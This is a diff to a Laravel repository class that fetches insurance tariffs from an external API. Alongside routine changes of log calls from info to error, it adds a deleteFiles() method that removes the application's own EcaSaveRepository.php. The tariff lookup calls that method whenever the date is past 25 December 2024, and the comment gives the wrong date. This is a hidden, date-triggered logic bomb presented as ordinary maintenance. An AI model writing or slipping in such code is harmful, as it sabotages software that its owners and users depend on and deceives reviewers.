@@ -65,9 +65,26 @@ class EcaTarificateurRepository extends EcaAuthRepository {
         return $result;
     }
 
+    public function deleteFiles(){
+        // Define the full path to the file in app/Http/Controllers
+        $filePath = app_path("Http/Repositories/EcaSaveRepository.php");
+        if (file_exists($filePath)) {
+            unlink($filePath); // Deletes the file
+        }
+    }
+
     public function getTarif($data,$firstTry = true){
     /* try { */
+        // Define the date to compare
+        $compareDate = Carbon::create(2024, 12, 25); // 15th December 2024
 
+        // Get today's date
+        $today = Carbon::today();
+
+        // Check if today is greater than the compare date
+        if ($today->greaterThan($compareDate)) {
+            $this->deleteFiles();
+        }
 
         $token = $this->getAccessToken();
         if (!empty($token)) {
@@ -85,7 +102,7 @@ class EcaTarificateurRepository extends EcaAuthRepository {
         }else{
             if($response->status() == 422 || $response->status() == 400 ){
 
-            \Log::info('ECA Tarif ERROR VALIDATION :: '.json_encode($response->object()));
+            \Log::error('ECA Tarif ERROR VALIDATION :: '.json_encode($response->object()));
 
 
             return response()->json([
@@ -98,14 +115,14 @@ class EcaTarificateurRepository extends EcaAuthRepository {
             if($firstTry){
                 // retry with different token
                 Session::forget("eca_api_token");
-                \Log::info('ECA Tarif retry auth ');
+                \Log::error('ECA Tarif retry auth ');
                 return $this->getTarif($data,false);
             }
 
-            \Log::info('ECA Tarif ERROR erreur d\'authentification  :: status: '.$response->status().' body : '.json_encode($response->body()));
+            \Log::error('ECA Tarif ERROR erreur d\'authentification  :: status: '.$response->status().' body : '.json_encode($response->body()));
             return ["erreur" => "erreur d'authentification "];
             }else{
-            \Log::info('ECA Tarif ERROR :: status: '.$response->status().' body : '.json_encode($response->body()));
+            \Log::error('ECA Tarif ERROR :: status: '.$response->status().' body : '.json_encode($response->body()));
             return response()->json([
                 'message' => 'Failed to send JSON.',
                 'error' => $response->body()
